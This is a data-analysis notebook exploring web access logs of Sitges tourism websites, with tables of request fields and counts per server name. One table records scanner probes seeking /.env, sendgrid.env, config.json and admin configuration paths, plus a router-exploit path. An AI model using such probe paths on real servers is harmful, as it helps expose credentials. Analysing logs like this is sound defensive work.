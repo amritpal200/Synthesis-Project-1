{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Overall analysis"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Unnamed: 0</th>\n",
       "      <th>server_name</th>\n",
       "      <th>IP</th>\n",
       "      <th>logname</th>\n",
       "      <th>authenticate</th>\n",
       "      <th>date</th>\n",
       "      <th>petition</th>\n",
       "      <th>URL</th>\n",
       "      <th>status</th>\n",
       "      <th>bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>user-agent</th>\n",
       "      <th>level</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>sitgesanytime.com</td>\n",
       "      <td>47.76.35.19</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 00:00:00+01:00</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/fr/pag492/explora-platges-i-ports-2/id12/les-...</td>\n",
       "      <td>301</td>\n",
       "      <td>4840</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>47.76.35.19</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 00:00:01+01:00</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/fr/pag492/explora-platges-i-ports-2/id12/les-...</td>\n",
       "      <td>200</td>\n",
       "      <td>5223</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>40.77.167.53</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 00:00:06+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ca/noticias/84/sitges-obt%C3%A9-el-certificat...</td>\n",
       "      <td>404</td>\n",
       "      <td>2509</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>3</td>\n",
       "      <td>sitgesanytime.com</td>\n",
       "      <td>47.76.35.19</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 00:00:06+01:00</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/fr/pag492/explora-platges-i-ports-2/id12/les-...</td>\n",
       "      <td>301</td>\n",
       "      <td>4840</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; Win64; x64) Apple...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>4</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>47.76.35.19</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 00:00:07+01:00</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/fr/pag492/explora-platges-i-ports-2/id12/les-...</td>\n",
       "      <td>200</td>\n",
       "      <td>5260</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; Win64; x64) Apple...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   Unnamed: 0            server_name            IP logname authenticate  \\\n",
       "0           0      sitgesanytime.com   47.76.35.19       -            -   \n",
       "1           1  www.sitgesanytime.com   47.76.35.19       -            -   \n",
       "2           2  www.sitgesanytime.com  40.77.167.53       -            -   \n",
       "3           3      sitgesanytime.com   47.76.35.19       -            -   \n",
       "4           4  www.sitgesanytime.com   47.76.35.19       -            -   \n",
       "\n",
       "                        date petition  \\\n",
       "0  2024-01-22 00:00:00+01:00     HEAD   \n",
       "1  2024-01-22 00:00:01+01:00     HEAD   \n",
       "2  2024-01-22 00:00:06+01:00      GET   \n",
       "3  2024-01-22 00:00:06+01:00     HEAD   \n",
       "4  2024-01-22 00:00:07+01:00     HEAD   \n",
       "\n",
       "                                                 URL  status  bytes referer  \\\n",
       "0  /fr/pag492/explora-platges-i-ports-2/id12/les-...     301   4840       -   \n",
       "1  /fr/pag492/explora-platges-i-ports-2/id12/les-...     200   5223       -   \n",
       "2  /ca/noticias/84/sitges-obt%C3%A9-el-certificat...     404   2509       -   \n",
       "3  /fr/pag492/explora-platges-i-ports-2/id12/les-...     301   4840       -   \n",
       "4  /fr/pag492/explora-platges-i-ports-2/id12/les-...     200   5260       -   \n",
       "\n",
       "                                          user-agent  level  \n",
       "0  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...      0  \n",
       "1  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...      0  \n",
       "2  Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...      5  \n",
       "3  Mozilla/5.0 (Windows NT 6.1; Win64; x64) Apple...      0  \n",
       "4  Mozilla/5.0 (Windows NT 6.1; Win64; x64) Apple...      0  "
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "import os\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "import numpy as np\n",
    "\n",
    "ROOT_DIR = os.path.dirname(os.path.abspath(\"\"))\n",
    "\n",
    "file = os.path.join(ROOT_DIR, \"data/sitges_access.csv\")\n",
    "df = pd.read_csv(file)\n",
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/home/eric/miniconda3/lib/python3.11/site-packages/tqdm/auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html\n",
      "  from .autonotebook import tqdm as notebook_tqdm\n"
     ]
    }
   ],
   "source": [
    "from ydata_profiling import ProfileReport\n",
    "profile = ProfileReport(df, title=\"profiling_report_0\", minimal=True)\n",
    "# profile.to_file(os.path.join(ROOT_DIR, \"data/profiling_report_0.html\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Unnamed: 0</th>\n",
       "      <th>status</th>\n",
       "      <th>bytes</th>\n",
       "      <th>level</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>count</th>\n",
       "      <td>1.077393e+06</td>\n",
       "      <td>1.077393e+06</td>\n",
       "      <td>1.077393e+06</td>\n",
       "      <td>1.077393e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>mean</th>\n",
       "      <td>7.131309e+04</td>\n",
       "      <td>2.145203e+02</td>\n",
       "      <td>2.274591e+04</td>\n",
       "      <td>1.439178e-01</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>std</th>\n",
       "      <td>4.392431e+04</td>\n",
       "      <td>4.298240e+01</td>\n",
       "      <td>3.167080e+05</td>\n",
       "      <td>8.773826e-01</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>min</th>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>2.000000e+02</td>\n",
       "      <td>0.000000e+00</td>\n",
       "      <td>-1.000000e+00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25%</th>\n",
       "      <td>3.366800e+04</td>\n",
       "      <td>2.000000e+02</td>\n",
       "      <td>1.170000e+03</td>\n",
       "      <td>0.000000e+00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50%</th>\n",
       "      <td>6.861500e+04</td>\n",
       "      <td>2.000000e+02</td>\n",
       "      <td>3.914000e+03</td>\n",
       "      <td>0.000000e+00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75%</th>\n",
       "      <td>1.070930e+05</td>\n",
       "      <td>2.000000e+02</td>\n",
       "      <td>1.104000e+04</td>\n",
       "      <td>0.000000e+00</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>max</th>\n",
       "      <td>1.825330e+05</td>\n",
       "      <td>5.040000e+02</td>\n",
       "      <td>4.901960e+07</td>\n",
       "      <td>1.500000e+01</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Unnamed: 0        status         bytes         level\n",
       "count  1.077393e+06  1.077393e+06  1.077393e+06  1.077393e+06\n",
       "mean   7.131309e+04  2.145203e+02  2.274591e+04  1.439178e-01\n",
       "std    4.392431e+04  4.298240e+01  3.167080e+05  8.773826e-01\n",
       "min    0.000000e+00  2.000000e+02  0.000000e+00 -1.000000e+00\n",
       "25%    3.366800e+04  2.000000e+02  1.170000e+03  0.000000e+00\n",
       "50%    6.861500e+04  2.000000e+02  3.914000e+03  0.000000e+00\n",
       "75%    1.070930e+05  2.000000e+02  1.104000e+04  0.000000e+00\n",
       "max    1.825330e+05  5.040000e+02  4.901960e+07  1.500000e+01"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.describe()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Analysis by Variables\n",
    "## ID (Unnamed: 0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(RangeIndex(start=0, stop=1077393, step=1), 1077393, 0, 182533)"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.index, len(df), df[\"Unnamed: 0\"].min(), df[\"Unnamed: 0\"].max()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## server_name"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "server_name\n",
       "www.sitgesanytime.com                               993800\n",
       "www.sitgestur.cat                                    41329\n",
       "sitgesanytime.com                                    26235\n",
       "91.134.184.72                                         2818\n",
       "www.sitgesfilmoffice.es                               1832\n",
       "www.bestsitges.net                                    1739\n",
       "www.sitgesfilmoffice.com                              1611\n",
       "ip72.ip-91-134-184.eu                                 1575\n",
       "www.sitgesfilmoffice.cat                              1396\n",
       "sitgestur.cat                                         1388\n",
       "sitgestur.net                                          842\n",
       "www.bestsitges.es                                      771\n",
       "ww.sitgesfilmoffice.es                                 407\n",
       "webmail.sitgesfilmoffice.cat                           314\n",
       "sitgestur.info                                         256\n",
       "sitgestur.org                                          144\n",
       "sitgesanytime.cat                                      133\n",
       "sitgesanytime.org                                      133\n",
       "mail.sitgesfilmoffice.cat                              125\n",
       "www.sitgesfilmoffice.catwww.sitgesfilmoffice.cat       123\n",
       "ftp.sitgestur.cat                                       80\n",
       "ipv4.sitgestur.cat                                      80\n",
       "www.sitgestur.net                                       42\n",
       "www.sitgesanytime.cat                                   37\n",
       "sitgesanytime.es                                        26\n",
       "api.ipify.org                                           24\n",
       "www.sitgestur.info                                      19\n",
       "www.sitgesanytime.org                                   15\n",
       "sitemaps.sitgesfilmoffice.cat                           14\n",
       "www.sitgestur.org                                       14\n",
       "mail.bestsitges.net                                     13\n",
       "sitemap.sitgesfilmoffice.com                            12\n",
       "app.sitgesfilmoffice.cat                                 7\n",
       "_mta-sts.sitgesfilmoffice.cat                            6\n",
       "mail.sitgesfilmoffice.com                                6\n",
       "0.0.0.0                                                  4\n",
       "admin.sitgesfilmoffice.com                               4\n",
       "admin.sitgesfilmoffice.cat                               3\n",
       "sitemap.sitgesfilmoffice.es                              2\n",
       "_dmarc.bestsitges.net                                    2\n",
       "ftp.sitgestur.info                                       2\n",
       "google.com                                               2\n",
       "185.36.81.42                                             2\n",
       "api.csgoroll.com                                         1\n",
       "ftp.sitgestur.net                                        1\n",
       "smtp.sitgesfilmoffice.com                                1\n",
       "5.188.210.227                                            1\n",
       "127.0.0.1                                                1\n",
       "api6.ipify.org                                           1\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[\"server_name\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Unnamed: 0</th>\n",
       "      <th>server_name</th>\n",
       "      <th>IP</th>\n",
       "      <th>logname</th>\n",
       "      <th>authenticate</th>\n",
       "      <th>date</th>\n",
       "      <th>petition</th>\n",
       "      <th>URL</th>\n",
       "      <th>status</th>\n",
       "      <th>bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>user-agent</th>\n",
       "      <th>level</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>35726</th>\n",
       "      <td>35726</td>\n",
       "      <td>ftp.sitgestur.info</td>\n",
       "      <td>71.6.134.231</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 06:38:32+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>128416</th>\n",
       "      <td>128416</td>\n",
       "      <td>mail.sitgesfilmoffice.com</td>\n",
       "      <td>198.235.24.180</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-22 17:21:03+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>185895</th>\n",
       "      <td>3361</td>\n",
       "      <td>google.com</td>\n",
       "      <td>66.45.237.154</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-23 00:38:41+01:00</td>\n",
       "      <td>CONNECT</td>\n",
       "      <td>google.com:443 HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Go-http-client/1.1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>207529</th>\n",
       "      <td>24995</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>123.129.135.123</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-23 04:57:44+01:00</td>\n",
       "      <td>POST</td>\n",
       "      <td>/GponForm/diag_Form?images/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>599</td>\n",
       "      <td>-</td>\n",
       "      <td>Hello, World</td>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>215969</th>\n",
       "      <td>33435</td>\n",
       "      <td>mail.sitgesfilmoffice.com</td>\n",
       "      <td>139.59.191.17</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-23 06:54:40+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>215970</th>\n",
       "      <td>33436</td>\n",
       "      <td>mail.sitgesfilmoffice.com</td>\n",
       "      <td>139.59.191.17</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-23 06:54:40+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>5641</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>267271</th>\n",
       "      <td>84737</td>\n",
       "      <td>_mta-sts.sitgesfilmoffice.cat</td>\n",
       "      <td>205.210.31.99</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-23 15:17:35+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>320536</th>\n",
       "      <td>4972</td>\n",
       "      <td>0.0.0.0</td>\n",
       "      <td>31.220.88.155</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-24 00:39:29+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/admin/config.php HTTP/1.0</td>\n",
       "      <td>301</td>\n",
       "      <td>5664</td>\n",
       "      <td>-</td>\n",
       "      <td>xfa1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>331850</th>\n",
       "      <td>16286</td>\n",
       "      <td>google.com</td>\n",
       "      <td>66.45.237.154</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-24 02:40:44+01:00</td>\n",
       "      <td>CONNECT</td>\n",
       "      <td>google.com:443 HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Go-http-client/1.1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>338963</th>\n",
       "      <td>23399</td>\n",
       "      <td>_dmarc.bestsitges.net</td>\n",
       "      <td>205.210.31.70</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-24 03:49:51+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>344441</th>\n",
       "      <td>28877</td>\n",
       "      <td>_dmarc.bestsitges.net</td>\n",
       "      <td>205.210.31.173</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-24 06:05:17+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>358081</th>\n",
       "      <td>42517</td>\n",
       "      <td>_mta-sts.sitgesfilmoffice.cat</td>\n",
       "      <td>205.210.31.223</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-24 08:11:24+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>359015</th>\n",
       "      <td>43451</td>\n",
       "      <td>smtp.sitgesfilmoffice.com</td>\n",
       "      <td>198.235.24.170</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-24 08:42:05+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>407147</th>\n",
       "      <td>91583</td>\n",
       "      <td>mail.sitgesfilmoffice.com</td>\n",
       "      <td>198.235.24.150</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-24 17:14:59+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>471766</th>\n",
       "      <td>20793</td>\n",
       "      <td>0.0.0.0</td>\n",
       "      <td>96.43.128.186</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 05:09:38+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/api/v2/cmdb/system/admin/admin HTTP/1.0</td>\n",
       "      <td>301</td>\n",
       "      <td>5678</td>\n",
       "      <td>-</td>\n",
       "      <td>Report Runner</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>523909</th>\n",
       "      <td>72936</td>\n",
       "      <td>0.0.0.0</td>\n",
       "      <td>102.131.60.136</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 13:17:01+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.0</td>\n",
       "      <td>301</td>\n",
       "      <td>5648</td>\n",
       "      <td>-</td>\n",
       "      <td>nvdorz</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529619</th>\n",
       "      <td>78646</td>\n",
       "      <td>app.sitgesfilmoffice.cat</td>\n",
       "      <td>79.124.59.162</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 14:04:47+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/.env HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>541</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529623</th>\n",
       "      <td>78650</td>\n",
       "      <td>app.sitgesfilmoffice.cat</td>\n",
       "      <td>79.124.59.162</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 14:04:49+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/sendgrid.env HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>485</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529624</th>\n",
       "      <td>78651</td>\n",
       "      <td>app.sitgesfilmoffice.cat</td>\n",
       "      <td>79.124.59.162</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 14:04:49+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/en/sendgrid.env HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>2598</td>\n",
       "      <td>http://app.sitgesfilmoffice.cat/sendgrid.env</td>\n",
       "      <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)...</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529625</th>\n",
       "      <td>78652</td>\n",
       "      <td>app.sitgesfilmoffice.cat</td>\n",
       "      <td>79.124.59.162</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 14:04:50+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/config.json HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>484</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529626</th>\n",
       "      <td>78653</td>\n",
       "      <td>app.sitgesfilmoffice.cat</td>\n",
       "      <td>79.124.59.162</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 14:04:50+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/en/config.json HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>2598</td>\n",
       "      <td>http://app.sitgesfilmoffice.cat/config.json</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529635</th>\n",
       "      <td>78662</td>\n",
       "      <td>app.sitgesfilmoffice.cat</td>\n",
       "      <td>79.124.59.162</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 14:04:51+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/api/.env HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>481</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.3...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>529636</th>\n",
       "      <td>78663</td>\n",
       "      <td>app.sitgesfilmoffice.cat</td>\n",
       "      <td>79.124.59.162</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 14:04:51+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/en/api/.env HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>2598</td>\n",
       "      <td>http://app.sitgesfilmoffice.cat/api/.env</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.3...</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>567751</th>\n",
       "      <td>116778</td>\n",
       "      <td>admin.sitgesfilmoffice.cat</td>\n",
       "      <td>183.136.225.45</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 19:45:28+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>5276</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.3...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>567754</th>\n",
       "      <td>116781</td>\n",
       "      <td>admin.sitgesfilmoffice.cat</td>\n",
       "      <td>183.136.225.45</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 19:45:40+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ca/ HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>17946</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>567759</th>\n",
       "      <td>116786</td>\n",
       "      <td>admin.sitgesfilmoffice.cat</td>\n",
       "      <td>183.136.225.45</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-25 19:45:45+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/robots.txt HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6169</td>\n",
       "      <td>-</td>\n",
